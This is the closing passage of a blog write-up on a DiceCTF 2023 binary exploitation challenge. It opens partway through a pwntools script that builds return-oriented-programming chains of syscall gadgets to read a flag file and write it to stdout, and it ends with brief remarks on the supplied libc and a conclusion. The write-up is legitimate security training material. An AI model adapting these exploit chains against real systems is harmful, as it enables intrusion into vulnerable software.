</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rax&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(constants<span style="color:#f92672">.</span>SYS_read)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;syscall&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(main_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Do you bop?&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># write to stdout</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1</span>) <span style="color:#75715e"># we saved &#39;flag.txt\0&#39; here</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rsi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(empty_addr) <span style="color:#75715e"># setting read only flag</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdx&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(flag_size)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rax&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(constants<span style="color:#f92672">.</span>SYS_write) <span style="color:#75715e"># open syscall number should be in rax </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># done setting up registers, call &#39;syscall&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;syscall&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(main_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Do you bop?&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h3 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h3>
<p>This challenge provided the libc file through the dockerfile. So there was not
really a need of finding offsets of libc functions to find a libc version from
the known database (and some people complained that using this method wasn&rsquo;t
really working).</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>It was a fun(?) challenge and I picked up many new things. There are so many
things I still don&rsquo;t know! That is the beauty I guess!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
      <li><a href="https://joonkim0625.github.io/tags/dicectf-2023/">Dicectf 2023</a></li>
      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
      <li><a href="https://joonkim0625.github.io/tags/binary-exploit/">Binary Exploit</a></li>
      <li><a href="https://joonkim0625.github.io/tags/ghidra/">Ghidra</a></li>
      <li><a href="https://joonkim0625.github.io/tags/python/">Python</a></li>
      <li><a href="https://joonkim0625.github.io/tags/script/">Script</a></li>
      <li><a href="https://joonkim0625.github.io/tags/ret2csu/">Ret2csu</a></li>
      <li><a href="https://joonkim0625.github.io/tags/ret2dlresolve/">Ret2dlresolve</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
